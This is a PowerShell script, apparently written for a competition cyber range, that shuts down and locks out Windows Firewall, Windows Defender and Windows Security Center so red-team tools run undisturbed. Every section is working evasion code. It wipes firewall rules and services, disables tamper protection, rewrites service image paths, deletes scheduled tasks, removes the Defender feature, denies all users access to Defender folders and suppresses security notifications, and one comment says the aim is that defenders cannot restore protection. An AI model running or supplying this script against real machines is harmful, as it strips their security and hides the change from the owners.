# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Defender & Firewall Kill Switch
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude Sonnet 4.6
# Disables, removes, and locks out Windows Defender and Windows Firewall
# on cyber range test VMs to prevent interference with red team tooling.
#
# Covers:
#   1. Windows Firewall  -  all profiles off, all rules wiped, service killed
#   2. Windows Defender  -  tamper protection, runtime disable, policy registry,
#                           services, scheduled tasks, feature uninstall, ACL lock
#   3. Security Center   -  service killed, notifications suppressed
#
# Run as Administrator before any other setup scripts.
# Safe to re-run  -  idempotent checks throughout.
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# -- Colour helpers ------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Windows Defender & Firewall Kill Switch"
Write-Warn "================================================================"
Write-Host ""

# =============================================================================
# SECTION 1  -  WINDOWS FIREWALL
# Disable all profiles, nuke all rules, kill and hobble the service.
# Blue team can't re-enable profiles if there are no rules and no service.
# =============================================================================
Write-Section "1/3 — Windows Firewall"

Write-Info "Disabling all firewall profiles..."
try {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
    Write-Success "  All profiles disabled."
} catch {
    Write-Err "  Set-NetFirewallProfile failed: $_"
}

Write-Info "Removing all firewall rules..."
try {
    Remove-NetFirewallRule -All -ErrorAction SilentlyContinue
    Write-Success "  All rules removed."
} catch {
    Write-Warn "  Remove-NetFirewallRule threw (may already be empty): $_"
}

Write-Info "Killing Windows Firewall service (mpssvc)..."
try {
    Set-Service -Name mpssvc -StartupType Disabled -ErrorAction SilentlyContinue
    Stop-Service -Name mpssvc -Force -ErrorAction SilentlyContinue
    Write-Success "  mpssvc stopped and set to Disabled."
} catch {
    Write-Warn "  mpssvc service change: $_"
}

Write-Info "Stomping firewall registry for all profiles..."
$fwBase     = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy'
$fwProfiles = @('DomainProfile', 'StandardProfile', 'PublicProfile')
foreach ($p in $fwProfiles) {
    $keyPath = "$fwBase\$p"
    try {
        if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
        Set-ItemProperty -Path $keyPath -Name EnableFirewall         -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $keyPath -Name DisableNotifications   -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $keyPath -Name DoNotAllowExceptions   -Value 0 -Type DWord -Force
        Write-Success "  $p registry set."
    } catch {
        Write-Err "  Failed on $p : $_"
    }
}

# =============================================================================
# SECTION 2  -  WINDOWS DEFENDER
# Layer order matters:
#   tamper protection -> runtime disable -> policy registry ->
#   services -> scheduled tasks -> feature removal -> ACL lock
# =============================================================================
Write-Section "2/3 — Windows Defender"

# -- 2a. Tamper Protection (must be first) -------------------------------------
Write-Info "Disabling Tamper Protection via registry..."
try {
    $tpKey = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
    if (-not (Test-Path $tpKey)) { New-Item -Path $tpKey -Force | Out-Null }
    Set-ItemProperty -Path $tpKey -Name TamperProtection -Value 4 -Type DWord -Force
    Write-Success "  TamperProtection set to 4 (off)."
} catch {
    Write-Warn "  Could not set TamperProtection: $_"
}

# -- 2b. Runtime disable via Set-MpPreference ----------------------------------
Write-Info "Disabling Defender via Set-MpPreference..."
$mpPrefs = @{
    DisableRealtimeMonitoring   = $true
    DisableIOAVProtection       = $true
    DisableBehaviorMonitoring   = $true
    DisableBlockAtFirstSeen     = $true
    DisableScriptScanning       = $true
    SubmitSamplesConsent        = 2   # NeverSend
    MAPSReporting               = 0   # Disabled
}
foreach ($pref in $mpPrefs.GetEnumerator()) {
    try {
        Set-MpPreference -$($pref.Key) $pref.Value -ErrorAction SilentlyContinue
        Write-Success "  $($pref.Key) = $($pref.Value)"
    } catch {
        Write-Warn "  Set-MpPreference $($pref.Key) : $_"
    }
}

# -- 2c. Policy registry paths (survive reboots and GUI toggle attempts) -------
Write-Info "Writing Defender policy registry keys..."
$defPolicyKeys = @(
    @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender';
       Values = @{ DisableAntiSpyware = 1; DisableAntiVirus = 1 } },
    @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection';
       Values = @{ DisableRealtimeMonitoring = 1; DisableBehaviorMonitoring = 1; DisableOnAccessProtection = 1; DisableScanOnRealtimeEnable = 1 } },
    @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet';
       Values = @{ SpynetReporting = 0; SubmitSamplesConsent = 2 } }
)
foreach ($entry in $defPolicyKeys) {
    try {
        if (-not (Test-Path $entry.Path)) { New-Item -Path $entry.Path -Force | Out-Null }
        foreach ($val in $entry.Values.GetEnumerator()) {
            Set-ItemProperty -Path $entry.Path -Name $val.Key -Value $val.Value -Type DWord -Force
        }
        Write-Success "  $($entry.Path) written."
    } catch {
        Write-Err "  Registry write failed [$($entry.Path)]: $_"
    }
}

# -- 2d. Disable and stop Defender services ------------------------------------
Write-Info "Disabling Defender services..."
$defServices = @('WinDefend', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService')
foreach ($svc in $defServices) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) {
            Stop-Service    -Name $svc -Force -ErrorAction SilentlyContinue
            Set-Service     -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue

            # Point ImagePath at a dummy to prevent service manager from re-launching it
            $svcRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
            if (Test-Path $svcRegPath) {
                Set-ItemProperty -Path $svcRegPath -Name ImagePath -Value "C:\Windows\system32\sc.exe" -Type ExpandString -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $svcRegPath -Name Start     -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
            }
            Write-Success "  $svc stopped, disabled, ImagePath neutered."
        } else {
            Write-Warn "  $svc not found on this SKU — skipping."
        }
    } catch {
        Write-Warn "  $svc : $_"
    }
}

# -- 2e. Kill Defender auto-restart scheduled tasks ----------------------------
Write-Info "Removing Defender scheduled tasks..."
$defTasks = @(
    'Windows Defender Cache Maintenance',
    'Windows Defender Cleanup',
    'Windows Defender Scheduled Scan',
    'Windows Defender Verification'
)
foreach ($task in $defTasks) {
    try {
        Unregister-ScheduledTask -TaskName $task `
            -TaskPath '\Microsoft\Windows\Windows Defender\' `
            -Confirm:$false -ErrorAction SilentlyContinue
        Write-Success "  Task removed: $task"
    } catch {
        Write-Warn "  Could not remove task '$task': $_"
    }
}

# -- 2f. Feature uninstall (Server SKU) ----------------------------------------
Write-Info "Attempting Server feature removal (Server SKU only)..."
try {
    if (Get-Command Get-WindowsFeature -ErrorAction SilentlyContinue) {
        $features = @('Windows-Defender', 'Windows-Defender-GUI')
        foreach ($feat in $features) {
            $f = Get-WindowsFeature -Name $feat -ErrorAction SilentlyContinue
            if ($f -and $f.Installed) {
                Uninstall-WindowsFeature -Name $feat -Remove -ErrorAction SilentlyContinue | Out-Null
                Write-Success "  Uninstalled feature: $feat"
            } else {
                Write-Warn "  Feature '$feat' not installed or not found."
            }
        }
    } else {
        Write-Warn "  Get-WindowsFeature not available — not a Server SKU, skipping."
    }
} catch {
    Write-Warn "  Server feature removal: $_"
}

# -- 2g. DISM feature removal (works on Workstation and Server) ----------------
Write-Info "Attempting DISM feature removal (all SKUs)..."
try {
    $dismOut = & dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /Quiet 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Success "  DISM removed Windows-Defender feature."
    } elseif ($LASTEXITCODE -eq 3010) {
        Write-Warn "  DISM: removal staged, reboot required."
    } elseif ($LASTEXITCODE -eq 2) {
        Write-Warn "  DISM: feature already absent or not applicable."
    } else {
        Write-Warn "  DISM exit $LASTEXITCODE : $dismOut"
    }
} catch {
    Write-Warn "  DISM call failed: $_"
}

# -- 2h. ACL lockout of Defender directories (last resort) ---------------------
Write-Info "Locking down Defender directories via ACL..."
$defDirs = @(
    'C:\Program Files\Windows Defender',
    'C:\ProgramData\Microsoft\Windows Defender'
)
foreach ($dir in $defDirs) {
    if (Test-Path $dir) {
        try {
            & takeown.exe /F "$dir" /R /A /D Y 2>&1 | Out-Null
            & icacls.exe  "$dir" /deny "*S-1-1-0:(OI)(CI)(RX)" /T /Q 2>&1 | Out-Null
            Write-Success "  ACL locked: $dir"
        } catch {
            Write-Warn "  ACL lock failed for $dir : $_"
        }
    } else {
        Write-Warn "  Directory not found (already removed?): $dir"
    }
}

# =============================================================================
# SECTION 3  -  WINDOWS SECURITY CENTER
# Kills the nag service and suppresses all re-enable notifications.
# =============================================================================
Write-Section "3/3 — Windows Security Center"

Write-Info "Disabling Security Center service (wscsvc)..."
try {
    Stop-Service  -Name wscsvc -Force -ErrorAction SilentlyContinue
    Set-Service   -Name wscsvc -StartupType Disabled -ErrorAction SilentlyContinue
    Write-Success "  wscsvc stopped and disabled."
} catch {
    Write-Warn "  wscsvc: $_"
}

Write-Info "Suppressing Security Center notifications via registry..."
try {
    $scKey = 'HKLM:\SOFTWARE\Microsoft\Security Center'
    if (-not (Test-Path $scKey)) { New-Item -Path $scKey -Force | Out-Null }
    $scValues = @{
        AntiVirusDisableNotify  = 1
        FirewallDisableNotify   = 1
        AntiVirusOverride       = 1
        FirewallOverride        = 1
        UacDisableNotify        = 1
        UpdatesDisableNotify    = 1
    }
    foreach ($val in $scValues.GetEnumerator()) {
        Set-ItemProperty -Path $scKey -Name $val.Key -Value $val.Value -Type DWord -Force
    }
    Write-Success "  Security Center notifications suppressed."
} catch {
    Write-Err "  Security Center registry: $_"
}

# =============================================================================
# DONE
# =============================================================================
Write-Host ""
Write-Warn "================================================================"
Write-Warn " Kill switch complete."
Write-Warn " Verify with:"
Write-Warn "   Get-MpComputerStatus"
Write-Warn "   Get-NetFirewallProfile | Select Name,Enabled"
Write-Warn "   Get-Service WinDefend,mpssvc | Select Name,Status,StartType"
Write-Warn ""
Write-Warn " NOTE: Some Defender components survive until reboot."
Write-Warn "       If tooling is still blocked, reboot and re-run."
Write-Warn "================================================================"
Write-Host ""
